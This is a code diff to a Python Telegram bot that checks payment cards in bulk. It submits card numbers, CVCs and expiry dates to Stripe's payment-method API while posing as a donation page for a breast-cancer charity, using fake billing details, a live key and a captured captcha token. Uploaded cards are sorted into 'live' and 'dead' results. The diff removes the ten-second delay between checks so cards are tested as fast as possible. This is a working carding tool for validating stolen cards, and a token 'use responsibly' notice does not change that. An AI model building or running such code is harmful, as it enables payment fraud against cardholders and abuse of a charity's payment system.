@@ -67,13 +67,13 @@ class CardChecker:
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
         }
         
-        # Generate new unique IDs for each request (important!)
+        # Generate new unique IDs for each request
         guid = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
         muid = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
         sid = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
         
         # Your original data with updated IDs
-        data = f'type=card&billing_details[address][city]=Heathport&billing_details[address][country]=US&billing_details[address][line1]=60269+Cleora+Pine+Apt.+6&billing_details[address][line2]=Cuyahoga+County&billing_details[address][postal_code]=10010&billing_details[address][state]=NY&billing_details[email]=sbxdzrc%40hi2.in&billing_details[name]=Mr+Brooks+Rohan&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid={guid}&muid={muid}&sid={sid}&payment_user_agent=stripe.js%2F2b425ea933%3B+stripe-js-v3%2F2b425ea933%3B+split-card-element&referrer=https%3A%2F%2Fbreastcancerresearch.enthuse.com&time_on_page={random.randint(10000, 99999)}&key=pk_live_ftYOjqGtfMkXICnngj1VQh99&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiUVZaWkg2UzBSTzFjUGJsV2RrdDZhdE80VGFiY29RQXZZUjY1ZzdzSXptTDdNVnJCMWpEK2VHakVSdHVGclkwRXNGWVFZYk9YbVhDZFUyd1pDNVNoalBObUl6b1ozL1VGVUVCMHZIZjNHQXVXYzdKK1NOMjRoS2x0bE1xTFRuQ1dmZ3NPWnVaMkcwMmdpMW1LV2NBMkhLenJRbkJkazVWOUNUVzREcThNc0hyWDNLZjJyK1Zzek5WeWRZVGVkOVpxMHZwSWNuc1d3L0NxaU9QaUp3cUQ1ZDNvVkdHYVRmOSs4ZjkzeWp4K3FFS0JVNzVpZU1LTkZhTndNRkExTSszZnltK1dkYnp4eGJUbFB5cFdwMks3UlVEMDFvalRHZm1uSHlJTGlFUm9yLzQwRVpGUTRwVlhKODNBT3Ryejk5bFl3TWxOdzdGT0IrSGEzTXU2QlkzMmdwN3RKa3NjdVdkZUVzd0QxRUtpY3F3TTZMT1poZm5mT1NvaEZyS3dlUkVNeHNadGhyMEt1Z3NUdTB1QjRVN2dOM2lGYjBTd2ZUSXJ5bEJLRlN0UU9DSmRHc0JIRm43R1phQzh0cXZZNDFaM3JDRnZxZ2orYlVlUU9qN3FoRXVTTE5ocWxoaHdzWGpFRkl4bitqYVo3MG9DbHo2ZS82TGlWeXVrVDZsb2VlOFk5ckp4R2dQUDU0ZTFvcUorSUlET0ZJeVNWNlIrdlRzdUxCYnc5VE93RHdVMDdpYzVCNnhneFAwS1cvdnE0cDFKMVFubEpSUCtubDFNc2dmdXVuaW5mK3N0dDBtZUtiRjhtRHRjOHBwSFl0YUJpd25qM3MxSzladmdwM0dLK0dBb0x4K25vdGZzTlNZakNUcGM0NWdoMDBmaDArTTlkd0FQbk9FT1RqY1VRZnp4bloxajlxeGtCaUtkQ2pLTHdkcnlEVUJYMjZFZmZKbDZ0WHpBMGk5M2k1VnJtbzNObThUbXh4VEhsemd5MSt5Q0ZoV0xlSGx5YlFOU2hIUGxNWjloWkEzQWY0Y1pLZlVCd3hpWFdCRnkweVI2V2JCMjFHRlNsS285WXo1dEdwZm1YaUt3cEs3VjFiSTZ3VERaQjUwTTZXSDlpbDNpTHNVeWdiK1ZmSTI5cFc2eXpRVTZ1bko0SzFhUGd6aDdZT0dQTk9PUUNENmZna2d1MktPRCtWTVM5cjF6RTNKMXp2TDBLZHl2R1lGem9tNGFFM1Fwa3FvZUFvTHJZMDd1ZnE3Y25DZ2NhQVcrVWcwMHpnc3B2NmVOcGRVUTIyNFZHbUhoc1lnTlZIeVZiQmlTZktheXY0RytRb3ZCcEVKVlAvVnF0MHRxZnVJUTR4OWNaTzArR2lnY1FJN2p0UHhaVCtYeXlEWEF1RUxTekZLc1o5eEZrS21VRzBlTUdzWk9oZUVYZ1VQV1RXRit2YUNXUS9BdytlYU0yYWVjOFFQeEN1OXd0VWd3NG44UnJIcjNWQ0RNaWFuOVVZallJUVdzS2ZpRFZGQmdSckVGdkhlQUhGckc0cmJheGd3T0IxeUNKc2xkVGx4Rm5GMHdpU2JReHlxNlB3VGc2RSt4Y3djWDhIRW9MWlVibjlVVk5OWnN3N043WUZPMDQ5d3lLRzN3bnhRd0tnSHd6MW1aVEc0amxZNGV3ZG9FQXVRY01vMVc1ZVZBczR5a3MvSlBwcElCa2NIV1BNTmF0RTVpazVWYXZ2YUF2bWRKaHh3NXIzd2VxV3YrRm5EUW5DZUd5cUhxSFU4d0ZuZXdKZVhNOVJ1ZktRMnpkT1dqM0Z3aTRodGZMZWVOUHdUTWxnR0YvL2l5YXpHbzBveDJib2lVVXZZM2U2WkxJV1I1WHdtcnN1VWh3cVlTMnVtazY2T2YwL1grUHp2S21zNXVyMk5EZk05cmdRZjhVdWhKZjViNXF2NXRGRE5jWFFpUUsvSzI2S20yV0tETHZxR21ZNUpiS0Z1K3A4VE9DZWV3eFA1QnRFUHNHb1FGRU8xMVc3VHc5bWc0S0RYbUd0NTMrOHExQnZJWUlhbGNLeU80Z05pZ3U3M0dBUDFGai9QTGZjWWFGMXJpQjRtNVNtTzdJalBpNWsrcXZCMWVzc1dGVCttUENyVSt4ZGJNUW5MOWZadzdLdDdyTnlCd3JKdXIrWTdacHhLakdJSEdQc045TTJyWUJ0WHlTYU1MRGNqeld5Tmd0ck84Y3NyVXg5SHZXVEVPMExwZXNTd3hmek94RzZoYytOdFdFM1d2NzFETXZNUUJ2dTJUdENYWVdYRVgrS0FtaTRnMGw2d3V1OXRFM1FySVJtWWE5R0wwNkpacDg5QkpmOW5BU3ozaXFZOGJ4bEN0Ly9ESGg8NHV0SFVtcXNUdXBDQ2wycGN4d1dvRHR3bkdVNm5YQjJVNEF3MHg5T2t2NFh4dDFzSFZQMDNUWVExa2hxMzFYQVdJaUMvK21TUHh5TWpoOEVNdzA4UUlQeTdwOTVVZEZBNmI3UW9qZXRjZ2pPMHBPdXZJNkZUSitYYWJZTnhCYzVQYVMwU01tQ1RjbE1zQ0pFWHlWeHZ0QmxvUzVaSURsbXAvNDBoSG5CUmR5S3NZNXRsUzFWVHdHbzVLYWJzU2F4TFhEcUJCREx1RDY2RlZvVy9TQmRIaVBlNFRzdFdJTHV6NHorOWN1SWhWS3NqdzVLNW90d1ZxQThyUXl1dW9sQUYxb0gvUURrWkZISzJzRFQ4YzBWQ2FnR2hqQUtOZHd4NW9jWTlEVmVXSnVjajJ2amtYNXlreGVLTEVNRzJaRzI0PSIsImV4cCI6MTc0NzU1NTI3MCwic2hhcmRfaWQiOjI1OTE4OTM1OSwia3IiOiI1MDEzNmI3IiwicGQiOjAsImNkYXRhIjoiUmpYZCtPSW9wUllhcy8yUVdzL2REUDMxWFdCYW93cTZrVVR0QlpkWUtBUUpneEdMOC9FbFRzZnZQbjgyQWp0ZTRyT3MvTG9QMzFGbW95QVRJOW8zelVwZ1BWdHNmSVhDWXJhODVQY2dpbTVIWTk2cGJuZG15a3BWc3Z4TEF5Wi9UWEJ0MnhyUnJKS3lUS29BRUM4Z3VmOTBkRVhyWVZuU3VFZXkzQmJtSHVHUkZ5OHM4ajRLejBQS2hSbnhrUHM4T1YwdjhQU0tYZUVUdHVJUSJ9.tkvFUaCs7qALz6IT2SyEmcqtr5cI0OMz6LAZuy2lwIg'
+        data = f'type=card&billing_details[address][city]=Heathport&billing_details[address][country]=US&billing_details[address][line1]=60269+Cleora+Pine+Apt.+6&billing_details[address][line2]=Cuyahoga+County&billing_details[address][postal_code]=10010&billing_details[address][state]=NY&billing_details[email]=sbxdzrc%40hi2.in&billing_details[name]=Mr+Brooks+Rohan&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid={guid}&muid={muid}&sid={sid}&payment_user_agent=stripe.js%2F2b425ea933%3B+stripe-js-v3%2F2b425ea933%3B+split-card-element&referrer=https%3A%2F%2Fbreastcancerresearch.enthuse.com&time_on_page={random.randint(10000, 99999)}&key=pk_live_ftYOjqGtfMkXICnngj1VQh99&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiUVZaWkg2UzBSTzFjUGJsV2RrdDZhdE80VGFiY29RQXZZUjY1ZzdzSXptTDdNVnJCMWpEK2VHakVSdHVGclkwRXNGWVFZYk9YbVhDZFUyd1pDNVNoalBObUl6b1ozL1VGVUVCMHZIZjNHQXVXYzdKK1NOMjRoS2x0bE1xTFRuQ1dmZ3NPWnVaMkcwMmdpMW1LV2NBMkhLenJRbkJkazVWOUNUVzREcThNc0hyWDNLZjJyK1Zzek5WeWRZVGVkOVpxMHZwSWNuc1d3L0NxaU9QaUp3cUQ1ZDNvVkdHYVRmOSs4ZjkzeWp4K3FFS0JVNzVpZU1LTkZhTndNRkExTSszZnltK1dkYnp4eGJUbFB5cFdwMks3UlVEMDFvalRHZm1uSHlJTGlFUm9yLzQwRVpGUTRwVlhKODNBT3Ryejk5bFl3TWxOdzdGT0IrSGEzTXU2QlkzMmdwN3RKa3NjdVdkZUVzd0QxRUtpY3F3TTZMT1poZm5mT1NvaEZyS3dlUkVNeHNadGhyMEt1Z3NUdTB1QjRVN2dOM2lGYjBTd2ZUSXJ5bEJLRfN0UU9DSmRHc0JIRm43R1phQzh0cXZZNDFaM3JDRnZxZ2orYlVlUU9qN3FoRXVTTE5ocWxoaHdzWGpFRkl4bitqYVo3MG9DbHo2ZS82TGlWeXVrVDZsb2VlOFk5ckp4R2dQUDU0ZTFvcUorSUlET0ZJeVNWNlIrdlRzdUxCYnc5VE93RHdVMDdpYzVCNnhneFAwS1cvdnE0cDFKMVFubEpSUCtubDFNc2dmdXVuaW5mK3N0dDBtZUtiRjhtRHRjOHBwSFl0YUJpd25qM3MxSzladmdwM0dLK0dBb0x4K25vdGZzTlNZakNUcGM0NWdoMDBmaDArTTlkd0FQbk9FT1RqY1VRZnp4bloxajlxeGtCaUtkQ2pLTHdkcnlEVUJYMjZFZmZKbDZ0WHpBMGk5M2k1VnJtbzNObThUbXh4VEhsemd5MSt5Q0ZoV0xlSGx5YlFOU2hIUGxNWjloWkEzQWY0Y1pLZlVCd3hpWFdCRnkweVI2V2JCMjFHRlNsS285WXo1dEdwZm1YaUt3cEs3VjFiSTZ3VERaQjUwTTZXSDlpbDNpTHNVeWdiK1ZmSTI5cFc2eXpRVTZ1bko0SzFhUGd6aDdZT0dQTk9PUUNENmZna2d1MktPRCtWTVM5cjF6RTNKMXp2TDBLZHl2R1lGem9tNGFFM1Fwa3FvZUFvTHJZMDd1ZnE3Y25DZ2NhQVcrVWcwMHpnc3B2NmVOcGRVUTIyNFZHbUhoc1lnTlZIeVZiQmlTZktheXY0RytRb3ZCcEVKVlAvVnF0MHRxZnVJUTR4OWNaTzArR2lnY1FJN2p0UHhaVCtYeXlEWEF1RUxTekZLc1o5eEZrS21VRzBlTUdzWk9oZUVYZ1VQV1RXRit2YUNXUS9BdytlYU0yYWVjOFFQeEN1OXd0VWd3NG44UnJIcjNWQ0RNaWFuOVVZallJUVdzS2ZpRFZGQmdSckVGdkhlQUhGckc0cmJheGd3T0IxeUNKc2xkVGx4Rm5GMHdpU2JReHlxNlB3VGc2RSt4Y3djWDhIRW9MWlVibjlVVk5OWnN3N043WUZPMDQ5d3lLRzN3bnhRd0tnSHd6MW1aVEc0amxZNGV3ZG9FQXVRY01vMVc1ZVZBczR5a3MvSlBwcElCa2NIV1BNTmF0RTVpazVWYXZ2YUF2bWRKaHh3NXIzd2VxV3YrRm5EUW5DZUd5cUhxSFU4d0ZuZXdKZVhNOVJ1ZktRMnpkT1dqM0Z3aTRodGZMZWVOUHdUTWxnR0YvL2l5YXpHbzBveDJib2lVVXZZM2U2WkxJV1I1WHdtcnN1VWh3cVlTMnVtazY2T2YwL1grUHp2S21zNXVyMk5EZk05cmdRZjhVdwhKZjViNXF2NXRGRE5jWFFpUUsvSzI2S20yV0tETHZxR21ZNUpiS0Z1K3A4VE9DZWV3eFA1QnRFUHNHb1FGRU8xMVc3VHc5bWc0S0RYbUd0NTMrOHExQnZJWUlhbGNLeU80Z05pZ3U3M0dBUDFGai9QTGZjWWFGMXJpQjRtNVNtTzdJalBpNWsrcXZCMWVzc1dGVCttUENyVSt4ZGJNUW5MOWZadzdLdDdyTnlCd3JKdXIrWTdacHhLakdJSEdQc045TTJyWUJ0WHlTYU1MRGNqeld5Tmd0ck84Y3NyVXg5SHZXVEVPMExwZXNTd3hmek94RzZoYytOdFdFM1d2NzFETXZNUUJ2dTJUdENYWVdYRVgrS0FtaTRnMGw2d3V1OXRFM1FySVJtWWE5R0wwNkpacDg5QkpmOW5BU3ozaXFZOGJ4bEN0Ly9ESGg8NHV0SFVtcXNUdXBDQ2wycGN4d1dvRHR3bkdVNm5YQjJVNEF3MHg5T2t2NFh4dDFzSFZQMDNUWVExa2hxMzFYQVdJaUMvK21TUHh5TWpoOEVNdzA4UUlQeTdwOTVVZEZBNmI3UW9qZXRjZ2pPMHBPdXZJNkZUSitYYWJZTnhCYzVQYVMwU01tQ1RjbE1zQ0pFWHlWeHZ0QmxvUzVaSURsbXAvNDBoSG5CUmR5S3NZNXRsUzFWVHdHbzVLYWJzU2F4TFhEcUJCREx1RDY2RlZvVy9TQmRIaVBlNFRzdFdJTHV6NHorOWN1SWhWS3NqdzVLNW90d1ZxQThyUXl1dW9sQUYxb0gvUURrWkZISzJzRFQ4YzBWQ2FnR2hqQUtOZHd4NW9jWTlEVmVXSnVjajJ2amtYNXlreGVLTEVNRzJaRzI0PSIsImV4cCI6MTc0NzU1NTI3MCwic2hhcmRfaWQiOjI1OTE4OTM1OSwia3IiOiI1MDEzNmI3IiwicGQiOjAsImNkYXRhIjoiUmpYZCtPSW9wUllhcy8yUVdzL2REUDMxWFdCYW93cTZrVVR0QlpkWUtBUUpneEdMOC9FbFRzZnZQbjgyQWp0ZTRyT3MvTG9QMzFGbW95QVRJOW8zelVwZ1BWdHNmSVhDWXJhODVQY2dpbTVIWTk2cGJuZG15a3BWc3Z4TEF5Wi9UWEJ0MnhyUnJKS3lUS29BRUM4Z3VmOTBkRVhyWVZuU3VFZXkzQmJtSHVHUkZ5OHM4ajRLejBQS2hSbnhrUHM4T1YwdjhQU0tYZUVUdHVJUSJ9.tkvFUaCs7qALz6IT2SyEmcqtr5cI0OMz6LAZuy2lwIg'
         
         try:
             response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
@@ -189,7 +189,7 @@ class CardChecker:
             return f"💳 {ccx} ➜ ❌ PAYMENT ERROR\n📝 {str(e)[:50]}"
     
     def start_checking(self, cards):
-        """Start checking cards in a separate thread - with 10 second delay as in your original"""
+        """Start checking cards in a separate thread - NO DELAY between cards"""
         self.running = True
         self.start_time = datetime.now()
         self.total_checked = 0
@@ -203,7 +203,7 @@ class CardChecker:
                 # Send initial status
                 status_message = bot.send_message(
                     self.user_id,
-                    "🔄 Starting card checker...\n⏳ 10 second delay between cards as per original..."
+                    "🔄 Starting card checker...\n⚡ No delay between cards..."
                 )
                 
                 approved_file = f"approved_{self.user_id}_{int(time.time())}.txt"
@@ -215,26 +215,28 @@ class CardChecker:
                     self.current_card = card
                     self.total_checked += 1
                     
-                    # Update status every card
-                    elapsed = datetime.now() - self.start_time
-                    status_text = (
-                        f"📊 <b>Checker Status</b>\n"
-                        f"✅ Live: {self.approved_count}\n"
-                        f"📋 Total Checked: {self.total_checked}\n"
-                        f"⏰ Elapsed: {elapsed.seconds // 60}m {elapsed.seconds % 60}s\n"
-                        f"🔄 Checking: {card[:15]}..."
-                    )
-                    try:
-                        bot.edit_message_text(
-                            status_text,
-                            chat_id=self.user_id,
-                            message_id=status_message.message_id
+                    # Update status every 10 cards (to avoid spam)
+                    if self.total_checked % 10 == 0 or self.total_checked == 1:
+                        elapsed = datetime.now() - self.start_time
+                        status_text = (
+                            f"📊 <b>Checker Status</b>\n"
+                            f"✅ Live: {self.approved_count}\n"
+                            f"📋 Total Checked: {self.total_checked}\n"
+                            f"⏰ Elapsed: {elapsed.seconds // 60}m {elapsed.seconds % 60}s\n"
+                            f"⚡ Speed: Fast (no delay)\n"
+                            f"🔄 Checking: {card[:15]}..."
                         )
-                    except:
-                        status_message = bot.send_message(
-                            self.user_id,
-                            status_text
-                        )
+                        try:
+                            bot.edit_message_text(
+                                status_text,
+                                chat_id=self.user_id,
+                                message_id=status_message.message_id
+                            )
+                        except:
+                            status_message = bot.send_message(
+                                self.user_id,
+                                status_text
+                            )
                     
                     result = self.check_card(card)
                     
@@ -253,8 +255,8 @@ class CardChecker:
                         with open(approved_file, 'a') as f:
                             f.write(f"{card} | {result}\n")
                     
-                    # 10 second delay as in your original code
-                    time.sleep(10)
+                    # NO DELAY between cards - removed time.sleep()
+                    # Cards will be checked as fast as possible
                 
                 # Send final results
                 elapsed = datetime.now() - self.start_time
@@ -264,7 +266,8 @@ class CardChecker:
                     f"✅ Live/Approved: {self.approved_count}\n"
                     f"❌ Dead/Declined: {self.total_checked - self.approved_count}\n"
                     f"📋 Total Checked: {self.total_checked}\n"
-                    f"⏰ Time Taken: {elapsed.seconds // 60}m {elapsed.seconds % 60}s\n\n"
+                    f"⏰ Time Taken: {elapsed.seconds // 60}m {elapsed.seconds % 60}s\n"
+                    f"⚡ Speed: Fast (no delay between cards)\n\n"
                 )
                 
                 if self.approved_cards:
@@ -313,7 +316,7 @@ def start_command(message):
 📝 <b>Card Format:</b>
 <code>card_number|mm|yy|cvv</code>
 
-⏱️ <b>Delay:</b> 10 seconds between checks (as per original)
+⚡ <b>Speed:</b> No delay between cards - Fast checking
 
 ⚠️ <b>Note:</b> Use this bot responsibly and legally.
     """
@@ -338,7 +341,7 @@ def help_command(message):
 • /stop - Stop checking
 • /stats - Your statistics
 
-<b>Delay:</b> 10 seconds between each card check
+<b>Speed:</b> ⚡ No delay between cards - Fast checking
 
 <b>Output Meaning:</b>
 ✅ Card Approved - Successfully processed
@@ -373,7 +376,7 @@ def check_card_command(message):
     bot.reply_to(
         message,
         f"🔄 Checking card: <code>{card[:15]}...</code>\n"
-        "⏳ Please wait (10 second delay)..."
+        "⚡ Checking now (no delay)..."
     )
     
     checker = CardChecker(user_id)
@@ -399,7 +402,7 @@ def check_file_command(message):
         "📤 Please upload a .txt file with cards.\n"
         "Each line should contain one card in format:\n"
         "<code>card_number|mm|yy|cvv</code>\n\n"
-        "⏱️ Delay: 10 seconds between each card"
+        "⚡ Speed: No delay between cards - Fast checking"
     )
     
     user_sessions[user_id] = 'waiting_for_file'
@@ -444,7 +447,7 @@ def handle_document(message):
             message,
             f"📋 Found {len(cards)} cards in file.\n"
             "🔄 Starting checker...\n"
-            f"⏳ Estimated time: {len(cards) * 10} seconds"
+            "⚡ Checking with no delay..."
         )
         
         # Create and start checker
@@ -483,7 +486,7 @@ def status_command(message):
         f"✅ Live/Approved: {checker.approved_count}\n"
         f"📋 Total Checked: {checker.total_checked}\n"
         f"⏰ Elapsed: {elapsed.seconds // 60}m {elapsed.seconds % 60}s\n"
-        f"⏱️ Delay: 10 seconds per card\n"
+        f"⚡ Speed: Fast (no delay between cards)\n"
     )
     
     if checker.current_card:
@@ -536,7 +539,7 @@ def stats_command(message):
         f"✅ Total Live/Approved: {checker.approved_count}\n"
         f"📋 Total Checked: {checker.total_checked}\n"
         f"📈 Success Rate: {checker.approved_count/max(checker.total_checked, 1)*100:.1f}%\n"
-        f"⏱️ Delay per card: 10 seconds\n"
+        f"⚡ Speed: No delay between cards\n"
     )
     
     if checker.approved_cards:
@@ -544,7 +547,29 @@ def stats_command(message):
     
     bot.reply_to(message, stats_text)
 
-if __name__ == '__main__':
+def main():
+    """Main function to start the bot with error handling"""
     logger.info("🤖 Bot is starting...")
     logger.info("📡 Polling for messages...")
-    bot.infinity_polling()
+    
+    try:
+        # Get bot info to verify token
+        bot_info = bot.get_me()
+        logger.info(f"✅ Bot connected: @{bot_info.username}")
+        logger.info(f"🔗 Bot link: https://t.me/{bot_info.username}")
+        
+        # Start polling with skip_pending to avoid conflict
+        bot.infinity_polling(skip_pending=True, timeout=30, long_polling_timeout=30)
+        
+    except telebot.apihelper.ApiTelegramException as e:
+        if "409" in str(e):
+            logger.error("❌ Bot conflict: Another instance is running.")
+            logger.error("💡 Solution: Stop any other running bot instances.")
+            logger.error("💡 Or wait a few minutes and restart.")
+        else:
+            logger.error(f"❌ Telegram API error: {e}")
+    except Exception as e:
+        logger.error(f"❌ Unexpected error: {e}")
+
+if __name__ == '__main__':
+    main()
